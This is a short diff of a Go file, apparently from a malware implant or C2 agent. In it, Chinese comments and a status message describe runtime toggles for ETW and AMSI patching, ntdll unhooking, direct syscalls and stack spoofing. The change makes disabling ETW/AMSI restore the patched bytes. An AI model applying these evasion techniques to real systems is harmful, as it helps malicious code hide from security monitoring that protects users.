@@ -20,9 +20,9 @@ import (
 // 语义（与前端面板一致）：
 //   - 覆写优先于编译期占位符，但**不能让平台做不到的能力生效**（例如 386 上的
 //     direct syscall、syscallMode=none 时的栈伪造）——这类请求直接拒绝并说明原因。
-//   - 启动期能力（etw/amsi/unhook）运行期打开 = 立刻执行一次；关掉只是改标记，
-//     不会撤销已经打上去的补丁（字节已经改了，撤销需要另一套磁盘映像比对逻辑，
-//     而那正是 unhook 干的事）。
+//   - 启动期能力（etw/amsi/unhook）运行期打开 = 立刻执行一次；关掉时 etw/amsi
+//     会按 patch 台账把原始字节写回去（阶段四），unhook 不重挂 —— 撤销一次
+//     unhook 等于主动把 hook 装回去，那是另一件事，刻意不做。
 func EvasionControl(cmdBuf []byte) ([]byte, error) {
 	args := strings.Fields(strings.ToLower(strings.TrimSpace(string(cmdBuf))))
 	if len(args) == 0 || args[0] == "status" || args[0] == "list" {
@@ -216,6 +216,6 @@ func renderEvasionStatus() string {
 		b.WriteString(line)
 		b.WriteString("\n")
 	}
-	b.WriteString("提示：运行期覆盖只在内存里，重连/重启后回到生成期值；启动期能力关掉不会撤销已生效的补丁。\n")
+	b.WriteString("提示：运行期覆盖只在内存里，重连/重启后回到生成期值；etw/amsi 关掉会还原原始字节（台账仅本进程有效），unhook 关掉不回挂。\n")
 	return b.String()
 }
